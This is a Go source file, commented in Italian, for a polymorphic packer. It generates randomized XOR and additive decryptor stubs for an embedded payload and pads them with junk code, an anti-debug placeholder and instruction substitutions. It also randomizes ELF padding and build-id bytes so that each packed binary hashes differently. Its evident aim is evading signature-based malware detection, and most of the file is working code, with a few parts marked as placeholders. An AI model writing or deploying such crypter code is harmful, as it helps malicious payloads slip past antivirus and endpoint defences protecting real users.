package pack

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"math/big"
	mathrand "math/rand"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// InstructionSubstitutionEngine
// ---------------------------------------------------------------------------

// InstructionSubstitutionEngine applica sostituzioni equivalenti al codice Go
type InstructionSubstitutionEngine struct {
	rng *mathrand.Rand
}

// NewInstructionSubstitutionEngine crea un nuovo engine
func NewInstructionSubstitutionEngine(seed int64) *InstructionSubstitutionEngine {
	return &InstructionSubstitutionEngine{
		rng: mathrand.New(mathrand.NewSource(seed)),
	}
}

// SubstitutionPattern definisce un pattern di sostituzione
type SubstitutionPattern struct {
	Original     string
	Alternatives []string
	Description  string
}

// GetAllPatterns ritorna tutti i pattern di sostituzione disponibili
func (ise *InstructionSubstitutionEngine) GetAllPatterns() []SubstitutionPattern {
	return []SubstitutionPattern{
		{Original: "{{VAR}} := 0", Alternatives: []string{"{{VAR}} := 1 - 1", "{{VAR}} := 2 * 0", "{{VAR}} := 0x00", "{{VAR}} = ^0 + 1", "{{VAR}} := (5 - 5)"}, Description: "Zero initialization variants"},
		{Original: "{{VAR}}++", Alternatives: []string{"{{VAR}} = {{VAR}} + 1", "{{VAR}} += 1"}, Description: "Increment variants"},
		{Original: "{{VAR}}--", Alternatives: []string{"{{VAR}} = {{VAR}} - 1", "{{VAR}} -= 1", "{{VAR}} = {{VAR}} + ^0"}, Description: "Decrement variants"},
		{Original: "{{VAR}} ^= {{KEY}}", Alternatives: []string{"{{VAR}} = {{VAR}} ^ {{KEY}}", "{{TEMP}} := {{VAR}}; {{VAR}} = {{TEMP}} ^ {{KEY}}", "{{VAR}} = ({{VAR}} | {{KEY}}) & ^({{VAR}} & {{KEY}})"}, Description: "XOR operation variants"},
		{Original: "{{VAR}} += {{VAL}}", Alternatives: []string{"{{VAR}} = {{VAR}} + {{VAL}}", "{{TEMP}} := {{VAL}}; {{VAR}} = {{VAR}} + {{TEMP}}"}, Description: "Addition variants"},
		{Original: "{{VAR}} -= {{VAL}}", Alternatives: []string{"{{VAR}} = {{VAR}} - {{VAL}}", "{{TEMP}} := {{VAL}}; {{VAR}} = {{VAR}} - {{TEMP}}"}, Description: "Subtraction variants"},
		{Original: "{{VAR}} = byte({{EXPR}})", Alternatives: []string{"{{VAR}} = byte({{EXPR}} & 0xFF)", "{{VAR}} = byte({{EXPR}} % 256)", "{{TEMP}} := {{EXPR}}; {{VAR}} = byte({{TEMP}})"}, Description: "Byte conversion variants"},
		{Original: "{{EXPR}} % 256", Alternatives: []string{"{{EXPR}} & 0xFF", "{{EXPR}} & 255", "({{EXPR}} << 24) >> 24"}, Description: "Modulo 256 variants"},
	}
}

// ApplySubstitution applica sostituzioni casuali al codice
func (ise *InstructionSubstitutionEngine) ApplySubstitution(code string, varName string) string {
	patterns := ise.GetAllPatterns()
	result := code
	for _, pattern := range patterns {
		if strings.Contains(result, pattern.Original) {
			if ise.rng.Intn(2) == 0 {
				alternative := pattern.Alternatives[ise.rng.Intn(len(pattern.Alternatives))]
				original := strings.ReplaceAll(pattern.Original, "{{VAR}}", varName)
				replacement := strings.ReplaceAll(alternative, "{{VAR}}", varName)
				result = strings.ReplaceAll(result, original, replacement)
			}
		}
	}
	return result
}

// GenerateEquivalentLoop genera un loop equivalente con diversi stili
func (ise *InstructionSubstitutionEngine) GenerateEquivalentLoop(loopVar, start, end, body string) string {
	switch ise.rng.Intn(2) {
	case 1:
		return fmt.Sprintf("%s := %s\nfor %s < %s {\n\t%s\n\t%s++\n}",
			loopVar, start, loopVar, end, body, loopVar)
	default:
		return fmt.Sprintf("for %s := %s; %s < %s; %s++ {\n\t%s\n}",
			loopVar, start, loopVar, end, loopVar, body)
	}
}

// GenerateConditional genera condizionali equivalenti
func (ise *InstructionSubstitutionEngine) GenerateConditional(condition, trueBlock, falseBlock string) string {
	switch ise.rng.Intn(2) {
	case 1:
		return fmt.Sprintf("switch {\ncase %s:\n\t%s\ndefault:\n\t%s\n}",
			condition, trueBlock, falseBlock)
	default:
		return fmt.Sprintf("if %s {\n\t%s\n} else {\n\t%s\n}",
			condition, trueBlock, falseBlock)
	}
}

// GenerateStorageVariant genera varianti di storage per dati temporanei
func (ise *InstructionSubstitutionEngine) GenerateStorageVariant(varName string, dataType string) string {
	variants := []string{
		fmt.Sprintf("var %s [1]%s", varName, dataType),
		fmt.Sprintf("%s := make([]%s, 1)", varName, dataType),
		fmt.Sprintf("%s := new(%s)", varName, dataType),
		fmt.Sprintf("var %s %s", varName, dataType),
	}
	return variants[ise.rng.Intn(len(variants))]
}

// GenerateBlockCipherOps genera operazioni di cipher casuali
func (ise *InstructionSubstitutionEngine) GenerateBlockCipherOps(data, key string) string {
	ops := []string{
		fmt.Sprintf("%s ^= %s", data, key),
		fmt.Sprintf("%s ^= %s\n\t%s = byte((int(%s) + int(%s)) %% 256)", data, key, key, data, key),
		fmt.Sprintf("%s ^= %s\n\t%s = (%s << 1) | (%s >> 7)", data, key, key, key, key),
		fmt.Sprintf("%s = byte((int(%s) + int(%s)) %% 256)\n\t%s ^= %s", data, data, key, data, key),
		fmt.Sprintf("%s = byte((int(%s) - int(%s) + 256) %% 256)\n\t%s ^= %s", data, data, key, data, key),
	}
	return ops[ise.rng.Intn(len(ops))]
}

// ---------------------------------------------------------------------------
// StubVariant / StubTemplateGenerator
// ---------------------------------------------------------------------------

// StubVariant definisce una variante dello stub decoder
type StubVariant struct {
	Name              string
	SourceCode        string
	DecryptionPattern string
	UniqueFeatures    []string
}

// StubTemplateGenerator genera varianti polimorfiche dello stub
type StubTemplateGenerator struct {
	seed              int64
	rng               *mathrand.Rand
	instructionEngine *InstructionSubstitutionEngine
}

// NewStubTemplateGenerator crea un nuovo generator
func NewStubTemplateGenerator() *StubTemplateGenerator {
	seed := time.Now().UnixNano()
	return &StubTemplateGenerator{
		seed:              seed,
		rng:               mathrand.New(mathrand.NewSource(seed)),
		instructionEngine: NewInstructionSubstitutionEngine(seed),
	}
}

// GenerateVariant genera una variante casuale dello stub
func (stg *StubTemplateGenerator) GenerateVariant(variantID int) *StubVariant {
	patterns := []string{
		"forward_xor", "reverse_xor", "additive_feedback",
		"xor_rotate", "multi_pass", "block_cipher_random", "control_flow_obf",
	}
	pattern := patterns[stg.rng.Intn(len(patterns))]
	varNames := stg.generateVariableNames()

	var sourceCode string
	var features []string
	switch pattern {
	case "forward_xor":
		sourceCode = stg.generateForwardXOR(varNames)
		features = []string{"forward_iteration", "simple_xor", "instruction_subst"}
	case "reverse_xor":
		sourceCode = stg.generateReverseXOR(varNames)
		features = []string{"reverse_iteration", "simple_xor", "instruction_subst"}
	case "additive_feedback":
		sourceCode = stg.generateAdditiveFeedback(varNames)
		features = []string{"forward_iteration", "feedback_loop", "additive_cipher"}
	case "xor_rotate":
		sourceCode = stg.generateXORRotate(varNames)
		features = []string{"forward_iteration", "bit_rotation", "xor"}
	case "multi_pass":
		sourceCode = stg.generateMultiPass(varNames)
		features = []string{"multi_pass_decrypt", "xor", "additive"}
	case "block_cipher_random":
		sourceCode = stg.generateBlockCipherRandom(varNames)
		features = []string{"block_cipher", "random_ops", "multi_operation"}
	case "control_flow_obf":
		sourceCode = stg.generateControlFlowObfuscated(varNames)
		features = []string{"control_flow_obf", "switch_based", "complex_flow"}
	}

	return &StubVariant{
		Name:              fmt.Sprintf("variant_%d_%s", variantID, pattern),
		SourceCode:        sourceCode,
		DecryptionPattern: pattern,
		UniqueFeatures:    features,
	}
}

func (stg *StubTemplateGenerator) generateVariableNames() map[string]string {
	prefixes := []string{"d", "x", "p", "buf", "tmp", "val", "k", "r", "s"}
	suffixes := []string{"ata", "tr", "ff", "ey", "eg", "em", "nt", ""}
	used := make(map[string]struct{})
	getUniqueName := func() string {
		for {
			name := prefixes[stg.rng.Intn(len(prefixes))] + suffixes[stg.rng.Intn(len(suffixes))]
			if _, exists := used[name]; !exists {
				used[name] = struct{}{}
				return name
			}
		}
	}
	return map[string]string{
		"data": getUniqueName(), "key": getUniqueName(), "i": getUniqueName(),
		"temp": getUniqueName(), "offset": getUniqueName(), "size": getUniqueName(),
	}
}

func (stg *StubTemplateGenerator) generateForwardXOR(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	code := fmt.Sprintf(`
// Variant: Forward XOR Decryption
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		{{DATA}}[{{I}}] ^= {{KEY}}
		%s
	}
}
`, stg.generateRandomString(8), garbage[0], garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateReverseXOR(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	code := fmt.Sprintf(`
// Variant: Reverse XOR Decryption
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := len({{DATA}}) - 1; {{I}} >= 0; {{I}}-- {
		%s
		{{DATA}}[{{I}}] ^= {{KEY}}
	}
}
`, stg.generateRandomString(8), garbage[0], garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateAdditiveFeedback(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	code := fmt.Sprintf(`
// Variant: Additive Feedback Loop
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		{{TEMP}} := {{DATA}}[{{I}}]
		{{DATA}}[{{I}}] ^= {{KEY}}
		{{KEY}} = byte((int({{TEMP}}) + int({{KEY}})) %% 256)
		%s
	}
}
`, stg.generateRandomString(8), garbage[0], garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateXORRotate(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	rot := stg.rng.Intn(7) + 1
	code := fmt.Sprintf(`
// Variant: XOR with Key Rotation
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		{{DATA}}[{{I}}] ^= {{KEY}}
		%s
		{{KEY}} = ({{KEY}} << %d) | ({{KEY}} >> (8 - %d))
	}
}
`, stg.generateRandomString(8), garbage[0], garbage[1], rot, rot)
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateMultiPass(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	code := fmt.Sprintf(`
// Variant: Multi-Pass Decryption
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		{{DATA}}[{{I}}] ^= {{KEY}}
	}
	%s
	{{OFFSET}} := byte({{KEY}} * 3)
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		{{DATA}}[{{I}}] = byte((int({{DATA}}[{{I}}]) - int({{OFFSET}})) %% 256)
	}
}
`, stg.generateRandomString(8), garbage[0], garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateBlockCipherRandom(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	cipherOp := stg.instructionEngine.GenerateBlockCipherOps("{{DATA}}[{{I}}]", "{{KEY}}")
	code := fmt.Sprintf(`
// Variant: Block Cipher Random Operations
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	for {{I}} := 0; {{I}} < len({{DATA}}); {{I}}++ {
		%s
		%s
	}
}
`, stg.generateRandomString(8), garbage[0], cipherOp, garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateControlFlowObfuscated(vars map[string]string) string {
	garbage := stg.generateGarbageCode()
	var storageDecl, dataAccess, keyAccess string
	switch stg.rng.Intn(3) {
	case 0:
		storageDecl = "var {{TEMP}}Storage [2]byte"
		dataAccess = "{{TEMP}}Storage[0]"
		keyAccess = "{{TEMP}}Storage[1]"
	case 1:
		storageDecl = "{{TEMP}}Storage := make([]byte, 2)"
		dataAccess = "{{TEMP}}Storage[0]"
		keyAccess = "{{TEMP}}Storage[1]"
	default:
		storageDecl = "var {{TEMP}}Data, {{TEMP}}Key byte"
		dataAccess = "{{TEMP}}Data"
		keyAccess = "{{TEMP}}Key"
	}
	code := fmt.Sprintf(`
// Variant: Control Flow Obfuscated
func decryptPayload_%s({{DATA}} []byte, {{KEY}} byte) {
	%s
	%s
	{{I}} := 0
	for {
		switch {
		case {{I}} >= len({{DATA}}):
			return
		default:
			%s = {{DATA}}[{{I}}]
			%s = {{KEY}}
			%s ^= %s
			{{DATA}}[{{I}}] = %s
			%s
			{{I}}++
		}
	}
}
`, stg.generateRandomString(8), garbage[0], storageDecl, dataAccess, keyAccess, dataAccess, keyAccess, dataAccess, garbage[1])
	for ph, v := range vars {
		code = strings.ReplaceAll(code, "{"+"{"+strings.ToUpper(ph)+"}}", v)
	}
	return code
}

func (stg *StubTemplateGenerator) generateGarbageCode() []string {
	garbagePatterns := [][]string{
		{"// Initialization", "// Processing"},
		{"_ = len({{DATA}}) // size check", "// Continue decryption"},
		{"if len({{DATA}}) == 0 { return }", "// Decrypt byte"},
		{"var _ = {{KEY}} // key validation", "// Apply transform"},
		{"// Anti-debug check placeholder", "// Transformation step"},
	}
	return garbagePatterns[stg.rng.Intn(len(garbagePatterns))]
}

func (stg *StubTemplateGenerator) generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[stg.rng.Intn(len(charset))]
	}
	return string(result)
}

// GetAllVariants genera tutte le varianti possibili
func (stg *StubTemplateGenerator) GetAllVariants(count int) []*StubVariant {
	variants := make([]*StubVariant, count)
	for i := range variants {
		variants[i] = stg.GenerateVariant(i)
	}
	return variants
}

// PolymorphicEngine gestisce la generazione di stub polimorfici
type PolymorphicEngine struct {
	Config            *PackConfig
	Seed              []byte
	TemplateGenerator *StubTemplateGenerator
	AvailableVariants []*StubVariant
}

// NewPolymorphicEngine crea un nuovo engine polimorfico
func NewPolymorphicEngine(config *PackConfig) *PolymorphicEngine {
	seed := randomBytes(32)
	generator := NewStubTemplateGenerator()

	// Genera 10 varianti di stub da usare casualmente
	variants := generator.GetAllVariants(10)

	return &PolymorphicEngine{
		Config:            config,
		Seed:              seed,
		TemplateGenerator: generator,
		AvailableVariants: variants,
	}
}

// SelectRandomVariant seleziona una variante casuale dello stub
func (pe *PolymorphicEngine) SelectRandomVariant() *StubVariant {
	if len(pe.AvailableVariants) == 0 {
		return nil
	}

	idx := randomInt(len(pe.AvailableVariants))
	return pe.AvailableVariants[idx]
}

// GenerateStubCode applica trasformazioni polimorfiche al codice sorgente dello stub
func (pe *PolymorphicEngine) GenerateStubCode(stubCode string) (string, []string, error) {
	if !pe.Config.PolymorphicStub {
		return stubCode, []string{"none"}, nil
	}

	result := stubCode
	appliedTechniques := []string{}

	// 1. Aggiungi junk code (inserimento di commenti casuali)
	if pe.Config.JunkCodeDensity > 0 {
		result = pe.insertJunkCode(result)
		appliedTechniques = append(appliedTechniques, "junk_code")
	}

	// 2. Variazione di stringhe e costanti
	result = pe.varyConstants(result)
	appliedTechniques = append(appliedTechniques, "constant_variation")

	// 3. Riordino di funzioni helper
	result = pe.shuffleHelperFunctions(result)
	appliedTechniques = append(appliedTechniques, "function_shuffle")

	// Nota: Le trasformazioni a livello assembly/bytecode vengono applicate
	// DOPO la compilazione dello stub, tramite ELFPolymorphicEngine o PEPolymorphicEngine

	return result, appliedTechniques, nil
}

// GenerateStub genera uno stub polimorfico con tecniche casuali
// applicate al codice già compilato (binario)
func (pe *PolymorphicEngine) GenerateStub(template *StubTemplate, payload []byte, metadata *PayloadMetadata) (*PolymorphicStub, error) {
	if !pe.Config.PolymorphicStub {
		return pe.generateBasicStub(template, payload, metadata)
	}

	// IMPORTANTE: template.BaseCode contiene già [stub_binary][payload][metadata][size]
	// Non dobbiamo modificare il codice eseguibile o la struttura finale.
	// Possiamo solo variare bytes in zone "safe" (ELF header padding).

	modifiedCode := make([]byte, len(template.BaseCode))
	copy(modifiedCode, template.BaseCode)

	techniques := []string{}

	// 1. Seleziona variante stub casuale (già applicata durante compilazione)
	selectedVariant := pe.SelectRandomVariant()
	if selectedVariant != nil {
		techniques = append(techniques, fmt.Sprintf("stub_variant_%s", selectedVariant.DecryptionPattern))
		for _, feature := range selectedVariant.UniqueFeatures {
			techniques = append(techniques, feature)
		}
	}

	// 2. Randomizza padding ELF (bytes 9-16)
	if template.TargetOS == "linux" && len(modifiedCode) >= 64 {
		// Cerca l'header ELF nei primi 64 bytes
		for i := 0; i < 64-16 && i < len(modifiedCode)-16; i++ {
			// Pattern ELF: 0x7f 'E' 'L' 'F'
			if modifiedCode[i] == 0x7f &&
				modifiedCode[i+1] == 'E' &&
				modifiedCode[i+2] == 'L' &&
				modifiedCode[i+3] == 'F' {
				// Bytes 9-16 sono EI_PAD, possono essere randomizzati
				rand.Read(modifiedCode[i+9 : i+16])
				techniques = append(techniques, "elf_pad_randomization")
				break
			}
		}
	}

	// 3. Aggiungi entropia ai padding esistenti (placeholder)
	paddingEntropy := randomBytes(64)
	_ = paddingEntropy // TODO: inserire nei padding trovati
	techniques = append(techniques, "padding_entropy")

	// 4. Il hash sarà diverso grazie alle modifiche
	techniques = append(techniques, "unique_hash")

	stub := &PolymorphicStub{
		Code:             modifiedCode,
		EntryPointOffset: 0,
		PayloadOffset:    len(template.BaseCode), // Il payload era già alla fine del template
		MetadataOffset:   len(template.BaseCode) - 8,
		Hash:             ComputeHash(modifiedCode),
		Techniques:       techniques,
	}

	return stub, nil
}

// generateBasicStub genera uno stub senza polimorfismo
func (pe *PolymorphicEngine) generateBasicStub(template *StubTemplate, payload []byte, metadata *PayloadMetadata) (*PolymorphicStub, error) {
	stub := &PolymorphicStub{
		Code:             template.BaseCode,
		EntryPointOffset: 0,
		PayloadOffset:    len(template.BaseCode),
		MetadataOffset:   len(template.BaseCode) - 100,
		Hash:             ComputeHash(template.BaseCode),
		Techniques:       []string{"basic"},
	}

	return stub, nil
}

// insertJunkCode aggiunge commenti e variabili inutilizzate casuali
func (pe *PolymorphicEngine) insertJunkCode(code string) string {
	// Genera commenti casuali da inserire
	junkComments := []string{
		"// Initialize variables\n",
		"// Setup environment\n",
		"// Check configuration\n",
		"// Prepare resources\n",
		"// Validate state\n",
		"// Configure settings\n",
	}

	// Inserisci un commento casuale all'inizio
	comment := junkComments[randomInt(len(junkComments))]

	// Genera alcune variabili dummy
	junkVars := fmt.Sprintf("var _ = %d\nvar _ = \"%s\"\n",
		randomInt(10000),
		randomString(8))

	return comment + junkVars + code
}

// varyConstants modifica stringhe e costanti numeriche
func (pe *PolymorphicEngine) varyConstants(code string) string {
	// Cerca pattern come const bufferSize = 8192
	// e cambia i valori mantenendo la semantica

	// Per ora, aggiungiamo solo variazioni di buffer size
	bufferSizes := []string{"4096", "8192", "16384", "32768"}
	chosenSize := bufferSizes[randomInt(len(bufferSizes))]

	// Aggiungi una const casuale
	extraConst := fmt.Sprintf("const _bufSize = %s\n", chosenSize)
	return extraConst + code
}

// shuffleHelperFunctions riordina le definizioni di funzioni helper
func (pe *PolymorphicEngine) shuffleHelperFunctions(code string) string {
	// In uno stub complesso, potremmo avere funzioni helper separate
	// che possono essere riordinate

	// Per ora, non facciamo nulla (le funzioni helper sono inline)
	return code
}

// randomString genera una stringa casuale di lunghezza n
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	result := make([]byte, n)
	for i := range result {
		result[i] = letters[randomInt(len(letters))]
	}
	return string(result)
}

// randomBytes genera byte casuali
func randomBytes(n int) []byte {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic(fmt.Sprintf("failed to generate random bytes: %v", err))
	}
	return b
}

// randomInt genera un int casuale tra 0 e max-1
func randomInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		panic(fmt.Sprintf("failed to generate random int: %v", err))
	}
	return int(n.Int64())
}

// modifyELFBuildID modifica il build-id se presente nell'ELF
func (pe *PolymorphicEngine) modifyELFBuildID(elfData []byte) []byte {
	// Cerca il marker .note.gnu.build-id
	buildIDMarker := []byte(".note.gnu.build-id")
	idx := bytes.Index(elfData, buildIDMarker)

	if idx != -1 && idx+len(buildIDMarker)+32 < len(elfData) {
		// Cerca una sequenza che potrebbe essere il build-id (20 bytes tipici)
		// Skippa il marker e cerca bytes che sembrano un hash
		searchStart := idx + len(buildIDMarker)
		searchEnd := searchStart + 100 // Cerca nei prossimi 100 bytes

		if searchEnd > len(elfData) {
			searchEnd = len(elfData)
		}

		// Cerca sequenze di bytes non nulli che potrebbero essere il build-id
		for i := searchStart; i < searchEnd-20; i++ {
			// Controlla se c'è una sequenza di 20 bytes non nulli
			hasContent := false
			for j := 0; j < 20; j++ {
				if elfData[i+j] != 0x00 {
					hasContent = true
					break
				}
			}

			// Se troviamo contenuto, randomizzalo
			if hasContent {
				rand.Read(elfData[i : i+20])
				break
			}
		}
	}

	return elfData
}
